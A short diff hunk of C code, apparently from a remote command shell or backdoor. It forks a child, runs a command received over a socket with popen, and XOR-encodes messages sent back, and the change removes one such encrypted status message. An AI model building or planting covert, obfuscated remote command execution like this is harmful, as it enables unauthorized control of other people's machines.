@@ -102,10 +102,6 @@ int main(void)
 	
 				if((child_pid = fork()) == 0)
 				{
-					char shell_msg[50];
-					snprintf(shell_msg, 50, "\n[+] Executing command on PID %i\n\n", getpid());
-					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
-					write(sock, xorshellmsg, strlen(shell_msg));
 
 					// Create a child process and run command inside of it
 					fp = popen(cmd, "r");
